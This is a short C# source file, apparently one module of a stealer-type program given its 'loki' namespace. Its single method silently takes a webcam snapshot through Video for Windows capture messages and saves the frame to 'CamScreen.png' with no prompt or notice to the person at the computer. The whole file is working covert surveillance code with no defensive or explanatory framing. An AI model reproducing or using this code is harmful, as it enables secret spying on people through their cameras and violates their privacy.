namespace loki.loki.Utilies
{
    using System.Runtime.InteropServices;

    internal class GetWebCam
    {
        public static void Get_webcam()
        {
            var intptr = NativeMethods.capCreateCaptureWindowA("VFW Capture", -1073741824, 0, 0, 640, 480, 0, 0);
            NativeMethods.SendMessage(intptr, 1034, 0, 0);
            NativeMethods.SendMessage(intptr, 1034, 0, 0);
            NativeMethods.SendMessage(intptr, 1049, 0, Marshal.StringToHGlobalAnsi("\\CamScreen.png").ToInt32());
            NativeMethods.SendMessage(intptr, 1035, 0, 0);
            NativeMethods.SendMessage(intptr, 16, 0, 0);
        }
    }
}